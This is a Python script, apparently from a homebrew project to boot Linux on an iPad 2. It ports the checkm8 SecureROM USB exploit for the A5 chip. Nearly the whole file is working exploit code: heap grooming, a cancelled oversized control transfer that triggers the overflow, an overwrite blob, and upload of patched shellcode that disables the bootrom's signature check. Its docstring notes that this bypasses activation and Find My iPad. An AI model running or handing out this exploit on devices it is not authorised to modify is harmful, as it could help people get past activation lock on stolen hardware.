#!/usr/bin/env python3
"""
checkm8-pwn.py — put an A5 iPad 2 (S5L8947, CPID 0x8947, SecureROM iBoot-1458.2)
into "pwned DFU" mode with the checkm8 bootrom USB exploit.

This is a self-contained Python 3 port of axi0mX's ipwndfu checkm8 exploit
(build/ipwndfu/checkm8.py), restricted to the A5 payload.  It talks to
libusb-1.0 directly through ctypes, so there are no pyusb version quirks.

checkm8 is a SecureROM (DFU-mode bootrom) USB exploit: it needs NO jailbreak,
NO iOS code execution, and it bypasses amfi, activation and Find My iPad
entirely — the device just has to be sitting in DFU mode (05ac:1227).
After this script succeeds the bootrom's image signature check is patched
out in memory, so `irecovery -f <unsigned image>` works and the boot chain
in boot/boot-linux.sh can upload the autogo iBEC and boot Linux.

Usage:
    python3 tools/checkm8-pwn.py              # pwn the DFU device on the bus
    python3 tools/checkm8-pwn.py --selftest   # build payload, no device needed

Exit status: 0 = device reports 'PWND:[checkm8]' (already pwned counts), 1 = fail.
"""

import ctypes
import os
import struct
import sys
import time
from ctypes import (POINTER, Structure, byref, c_char, c_int, c_long, c_uint8,
                    c_uint16, c_uint32, c_void_p, create_string_buffer)

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
IPWNDFU_BIN = os.path.join(ROOT, 'build', 'ipwndfu', 'bin')

VENDOR_APPLE = 0x05AC
PRODUCT_DFU = 0x1227

CPID_A5 = 0x8947
SRTG_A5 = 'SRTG:[iBoot-1458.2]'

# ---------------------------------------------------------------- payload --
PAYLOAD_OFFSET_ARMV7 = 384
PAYLOAD_SIZE_ARMV7 = 320

# A5 (S5L8947) constants, copied verbatim from ipwndfu checkm8.py payload(0x8947)
CONSTANTS_USB_S5L8947X = [
    0x34000000,   # 1 - LOAD_ADDRESS
    0x65786563,   # 2 - EXEC_MAGIC
    0x646F6E65,   # 3 - DONE_MAGIC
    0x6D656D63,   # 4 - MEMC_MAGIC
    0x6D656D73,   # 5 - MEMS_MAGIC
    0x79EC + 1,   # 6 - USB_CORE_DO_IO
]
CONSTANTS_CHECKM8_S5L8947X = [
    0x3402D87C,   # 1 - gUSBDescriptors
    0x3402DDF8,   # 2 - gUSBSerialNumber
    0x72A8 + 1,   # 3 - usb_create_string_descriptor
    0x3402C2DA,   # 4 - gUSBSRNMStringDescriptor
    0x34039800,   # 5 - PAYLOAD_DEST
    PAYLOAD_OFFSET_ARMV7,  # 6 - PAYLOAD_OFFSET
    PAYLOAD_SIZE_ARMV7,    # 7 - PAYLOAD_SIZE
    0x3402D92C,   # 8 - PAYLOAD_PTR
]

# DeviceConfig('iBoot-1458.2', 0x8947, large_leak=626, overwrite, None, None)
A5_LARGE_LEAK = 626


def prepare_shellcode(name, constants):
    """Load bin/<name>.bin and substitute the 0xBAD0000x placeholder constants."""
    with open(os.path.join(IPWNDFU_BIN, name + '.bin'), 'rb') as f:
        shellcode = f.read()
    size = 4  # armv7: 32-bit constants
    placeholders_offset = len(shellcode) - size * len(constants)
    for i in range(len(constants)):
        offset = placeholders_offset + size * i
        (value,) = struct.unpack('<1I', shellcode[offset:offset + size])
        assert value == 0xBAD00001 + i, 'bad placeholder in %s' % name
    return shellcode[:placeholders_offset] + struct.pack('<%dI' % len(constants), *constants)


def asm_thumb_trampoline(src, dest):
    """THUMB 'LDR.W PC, [PC(, #2)]' — 8-byte trampoline to dest (thumb)."""
    assert src % 2 == 1 and dest % 2 == 1
    if src % 4 == 1:
        return struct.pack('<2I', 0xF000F8DF, dest)
    return struct.pack('<2I', 0xF002F8DF, dest)


def build_payload():
    """The exact A5 payload from ipwndfu checkm8.py payload(0x8947)."""
    handler = asm_thumb_trampoline(0x34039800 + 1, 0x7BC8 + 1) \
        + prepare_shellcode('usb_0xA1_2_armv7', CONSTANTS_USB_S5L8947X)[8:]
    shellcode = prepare_shellcode('checkm8_armv7', CONSTANTS_CHECKM8_S5L8947X)
    assert len(shellcode) <= PAYLOAD_OFFSET_ARMV7
    assert len(handler) <= PAYLOAD_SIZE_ARMV7
    payload = shellcode + b'\0' * (PAYLOAD_OFFSET_ARMV7 - len(shellcode)) + handler
    # DeviceConfig overwrite blob: zeros + LOAD_ADDRESS at offset 0x660+20
    overwrite = b'\0' * 0x660 + struct.pack('<20xI4x', 0x34000000)
    return payload, overwrite


# ------------------------------------------------------------------ libusb --
class DeviceDescriptor(Structure):
    _fields_ = [
        ('bLength', c_uint8), ('bDescriptorType', c_uint8), ('bcdUSB', c_uint16),
        ('bDeviceClass', c_uint8), ('bDeviceSubClass', c_uint8),
        ('bDeviceProtocol', c_uint8), ('bMaxPacketSize0', c_uint8),
        ('idVendor', c_uint16), ('idProduct', c_uint16), ('bcdDevice', c_uint16),
        ('iManufacturer', c_uint8), ('iProduct', c_uint8),
        ('iSerialNumber', c_uint8), ('bNumConfigurations', c_uint8),
    ]


class Transfer(Structure):
    _fields_ = [
        ('dev_handle', c_void_p),
        ('flags', c_uint8),
        ('endpoint', c_uint8),
        ('type', c_uint8),
        ('timeout', c_uint32),
        ('status', c_int),
        ('length', c_int),
        ('actual_length', c_int),
        ('callback', c_void_p),
        ('user_data', c_void_p),
        ('buffer', c_void_p),
        ('num_iso_packets', c_int),
    ]


class Timeval(Structure):
    _fields_ = [('tv_sec', c_long), ('tv_usec', c_long)]


LIBUSB_TRANSFER_TYPE_CONTROL = 0
LIBUSB_TRANSFER_FREE_BUFFER = 1 << 1
LIBUSB_ERROR_TIMEOUT = -7


class LibUSB:
    CANDIDATES = ['libusb-1.0.so.0', 'libusb-1.0.so', 'libusb-1.0.so.0.8.6',
                  'libusb-1.0.0.dylib', 'libusb-1.0.dylib']

    def __init__(self):
        self.lib = None
        for name in self.CANDIDATES:
            try:
                self.lib = ctypes.CDLL(name)
                break
            except OSError:
                continue
        if self.lib is None:
            sys.exit('error: libusb-1.0 not found (install libusb-1.0-0)')
        L = self.lib
        L.libusb_init.argtypes = [POINTER(c_void_p)]
        L.libusb_init.restype = c_int
        L.libusb_exit.argtypes = [c_void_p]
        L.libusb_get_device_list.argtypes = [c_void_p, POINTER(POINTER(c_void_p))]
        L.libusb_get_device_list.restype = ctypes.c_ssize_t
        L.libusb_free_device_list.argtypes = [POINTER(c_void_p), c_int]
        L.libusb_get_device_descriptor.argtypes = [c_void_p, POINTER(DeviceDescriptor)]
        L.libusb_get_device_descriptor.restype = c_int
        L.libusb_open.argtypes = [c_void_p, POINTER(c_void_p)]
        L.libusb_open.restype = c_int
        L.libusb_close.argtypes = [c_void_p]
        L.libusb_claim_interface.argtypes = [c_void_p, c_int]
        L.libusb_claim_interface.restype = c_int
        L.libusb_release_interface.argtypes = [c_void_p, c_int]
        L.libusb_release_interface.restype = c_int
        L.libusb_kernel_driver_active.argtypes = [c_void_p, c_int]
        L.libusb_kernel_driver_active.restype = c_int
        L.libusb_detach_kernel_driver.argtypes = [c_void_p, c_int]
        L.libusb_detach_kernel_driver.restype = c_int
        L.libusb_attach_kernel_driver.argtypes = [c_void_p, c_int]
        L.libusb_attach_kernel_driver.restype = c_int
        L.libusb_reset_device.argtypes = [c_void_p]
        L.libusb_reset_device.restype = c_int
        L.libusb_control_transfer.argtypes = [c_void_p, c_uint8, c_uint8, c_uint16,
                                               c_uint16, c_void_p, c_uint16, c_uint32]
        L.libusb_control_transfer.restype = c_int
        L.libusb_alloc_transfer.argtypes = [c_int]
        L.libusb_alloc_transfer.restype = POINTER(Transfer)
        L.libusb_submit_transfer.argtypes = [POINTER(Transfer)]
        L.libusb_submit_transfer.restype = c_int
        L.libusb_cancel_transfer.argtypes = [POINTER(Transfer)]
        L.libusb_cancel_transfer.restype = c_int
        L.libusb_free_transfer.argtypes = [POINTER(Transfer)]
        L.libusb_handle_events_timeout.argtypes = [c_void_p, POINTER(Timeval)]
        L.libusb_handle_events_timeout.restype = c_int
        self.ctx = c_void_p()
        rc = L.libusb_init(byref(self.ctx))
        if rc != 0:
            sys.exit('error: libusb_init failed (%d)' % rc)
        self._malloc = ctypes.CDLL(None).malloc
        self._malloc.argtypes = [ctypes.c_size_t]
        self._malloc.restype = c_void_p

    # -- device discovery -------------------------------------------------
    def find_dfu(self, timeout=5.0):
        """Return (dev, handle) for the first Apple DFU device, or (None, None)."""
        L = self.lib
        start = time.time()
        while True:
            devs = POINTER(c_void_p)()
            n = L.libusb_get_device_list(self.ctx, byref(devs))
            found = None
            for i in range(n):
                dev = devs[i]
                desc = DeviceDescriptor()
                if L.libusb_get_device_descriptor(dev, byref(desc)) != 0:
                    continue
                if desc.idVendor == VENDOR_APPLE and desc.idProduct == PRODUCT_DFU:
                    found = dev
                    break
            L.libusb_free_device_list(devs, 1)
            if found is not None:
                handle = c_void_p()
                rc = L.libusb_open(found, byref(handle))
                if rc != 0:
                    sys.exit('error: libusb_open failed (%d) — permission? '
                             'install the udev rule from boot/boot-linux.sh' % rc)
                return found, handle
            if time.time() - start > timeout:
                return None, None
            time.sleep(0.01)

    @staticmethod
    def close(handle):
        # best effort: release interface 0 and close
        LibUSB._inst.lib.libusb_release_interface(handle, 0)
        LibUSB._inst.lib.libusb_close(handle)

    # -- transfers --------------------------------------------------------
    @staticmethod
    def ctrl(handle, bmRequestType, bRequest, wValue, wIndex, data, timeout):
        """Synchronous control transfer; returns libusb return code (ignored by callers)."""
        L = LibUSB._inst.lib
        if data is None:
            buf, length = None, 0
        else:
            buf = create_string_buffer(bytes(data), max(len(data), 1))
            length = len(data)
        return L.libusb_control_transfer(handle, bmRequestType, bRequest, wValue,
                                          wIndex, buf, length, timeout), buf

    @staticmethod
    def ctrl_in(handle, bmRequestType, bRequest, wValue, wIndex, length, timeout):
        L = LibUSB._inst.lib
        buf = create_string_buffer(length)
        rc = L.libusb_control_transfer(handle, bmRequestType, bRequest, wValue,
                                       wIndex, buf, length, timeout)
        return rc, buf.raw[:max(rc, 0)] if rc > 0 else b''

    @staticmethod
    def async_ctrl_then_cancel(handle, bmRequestType, bRequest, wValue, wIndex,
                               data, spin_seconds):
        """Submit a control OUT transfer and cancel it almost immediately.

        This is the heart of checkm8: the oversized data stage is already on the
        wire when the transfer is cancelled, and the bootrom's USB ISR chews on
        it.  The buffer is malloc'd and handed to libusb with FREE_BUFFER.
        """
        L = LibUSB._inst.lib
        packet = struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, len(data)) + data
        buf = LibUSB._inst._malloc(len(packet))
        ctypes.memmove(buf, packet, len(packet))
        transfer = L.libusb_alloc_transfer(0)
        assert transfer
        t = transfer.contents
        t.dev_handle = handle
        t.endpoint = 0
        t.type = LIBUSB_TRANSFER_TYPE_CONTROL
        t.timeout = 0
        t.buffer = buf
        t.length = len(packet)
        t.user_data = None
        t.callback = None
        t.flags = LIBUSB_TRANSFER_FREE_BUFFER
        rc = L.libusb_submit_transfer(transfer)
        assert rc == 0, 'libusb_submit_transfer failed (%d)' % rc
        start = time.perf_counter()
        while time.perf_counter() - start < spin_seconds:
            pass
        L.libusb_cancel_transfer(transfer)
        # drain events so the cancellation completes before we close the handle
        tv = Timeval(0, 50000)
        for _ in range(4):
            L.libusb_handle_events_timeout(LibUSB._inst.ctx, byref(tv))
        L.libusb_free_transfer(transfer)

    @staticmethod
    def usb_reset(handle):
        try:
            LibUSB._inst.lib.libusb_reset_device(handle)
        except Exception:
            pass

    @staticmethod
    def serial(handle, desc_index):
        # Raw GET_DESCRIPTOR(string) + UTF-16LE decode — works on any libusb
        # version (this host's libusb predates libusb_get_string_descriptor_simple).
        rc, raw = LibUSB.ctrl_in(handle, 0x80, 6, (3 << 8) | desc_index, 0x0409, 255, 1000)
        if rc > 4 and raw[0] == rc and raw[1] == 3:
            return raw[2:rc].decode('utf-16-le', 'replace')
        return ''


LibUSB._inst = None


# ------------------------------------------------------------- exploit ------
def acquire(usb, want_serial=True):
    dev, handle = usb.find_dfu()
    if handle is None:
        return None, None, ''
    L = usb.lib
    if L.libusb_kernel_driver_active(handle, 0) == 1:
        L.libusb_detach_kernel_driver(handle, 0)
    rc = L.libusb_claim_interface(handle, 0)
    if rc != 0:
        sys.exit('error: libusb_claim_interface failed (%d) — permission? '
                 'install the udev rule from boot/boot-linux.sh' % rc)
    desc = DeviceDescriptor()
    # re-read descriptor through the same device pointer
    L.libusb_get_device_descriptor(dev, byref(desc))
    serial = usb.serial(handle, desc.iSerialNumber) if want_serial else ''
    return dev, handle, serial


def release(handle):
    LibUSB.close(handle)


def no_error_ctrl(handle, *args):
    LibUSB.ctrl(handle, *args)


def exploit():
    usb = LibUSB()
    LibUSB._inst = usb
    payload, overwrite = build_payload()

    print('*** checkm8 (A5/S5L8947, iBoot-1458.2) — port of axi0mX ipwndfu ***')
    start = time.time()

    dev, handle, serial = acquire(usb)
    if handle is None:
        sys.exit('error: no Apple device in DFU mode (05ac:1227).\n'
                 'Put the iPad 2 into DFU: hold Power+Home ~10s until the screen\n'
                 'goes black, release Power, keep holding Home until the host sees\n'
                 '"Apple Mobile Device (DFU Mode)". Keep it plugged into USB.')
    print('Found:', serial.strip())
    if 'PWND:[' in serial:
        print('Device is already in pwned DFU mode. Nothing to do.')
        release(handle)
        return 0
    if SRTG_A5 not in serial:
        if 'CPID:%04X' % CPID_A5 in serial or 'CPID:8947' in serial:
            sys.exit('error: CPID matches A5 but the serial lacks %s.\n'
                     'The device is not in SecureROM DFU mode (it is in LLB/iBSS\n'
                     'DFU mode). Re-enter DFU from a powered-off state.' % SRTG_A5)
        sys.exit('error: not an A5 device (CPID 0x8947 expected). Serial: %s' % serial.strip())
    release(handle)

    # --- heap grooming: 626 "leak" requests (A5 large_leak path) ---
    dev, handle, _ = acquire(usb, want_serial=False)
    no_error_ctrl(handle, 0x02, 3, 0x0, 0x80, None, 10)          # stall
    for _ in range(A5_LARGE_LEAK):
        no_error_ctrl(handle, 0x80, 6, 0x304, 0x40A, b'\0' * 0x40, 1)   # leak
    no_error_ctrl(handle, 0x80, 6, 0x304, 0x40A, b'\0' * 0x41, 1)       # no_leak
    LibUSB.usb_reset(handle)
    release(handle)

    # --- trigger the overflow ---
    dev, handle, _ = acquire(usb, want_serial=False)
    LibUSB.async_ctrl_then_cancel(handle, 0x21, 1, 0, 0, b'A' * 0x800, 0.0001)
    no_error_ctrl(handle, 0x21, 4, 0, 0, None, 1000)
    release(handle)

    time.sleep(0.5)

    # --- redirect the USB RX buffer and upload the payload ---
    dev, handle, _ = acquire(usb, want_serial=False)
    no_error_ctrl(handle, 0x02, 3, 0x0, 0x80, None, 10)          # stall
    no_error_ctrl(handle, 0x80, 6, 0x304, 0x40A, b'\0' * 0x40, 1)       # leak
    no_error_ctrl(handle, 0x00, 0x00, 0, 0, overwrite, 100)             # overwrite
    for i in range(0, len(payload), 0x800):
        no_error_ctrl(handle, 0x21, 1, 0, 0, payload[i:i + 0x800], 100)
    LibUSB.usb_reset(handle)
    release(handle)

    # --- verify ---
    dev, handle, serial = acquire(usb)
    if handle is None:
        sys.exit('error: device disappeared after the exploit.')
    print('Found:', serial.strip())
    release(handle)
    if 'PWND:[checkm8]' not in serial:
        sys.exit('error: exploit failed — device did not enter pwned DFU mode.\n'
                 'Re-enter DFU mode and try again (the exploit is not persistent\n'
                 'across DFU re-entry, but it is deterministic).')
    print('Device is now in pwned DFU mode.')
    print('(%0.2f seconds)' % (time.time() - start))
    print('Next: ./boot/boot-linux.sh --skip-pwn')
    return 0


def selftest():
    payload, overwrite = build_payload()
    print('payload:   %d bytes (shellcode padded to %d + handler %d)'
          % (len(payload), PAYLOAD_OFFSET_ARMV7, len(payload) - PAYLOAD_OFFSET_ARMV7))
    print('overwrite: %d bytes' % len(overwrite))
    import hashlib
    print('payload sha1:   %s' % hashlib.sha1(payload).hexdigest())
    print('overwrite sha1: %s' % hashlib.sha1(overwrite).hexdigest())
    return 0


if __name__ == '__main__':
    if '--selftest' in sys.argv:
        sys.exit(selftest())
    sys.exit(exploit())
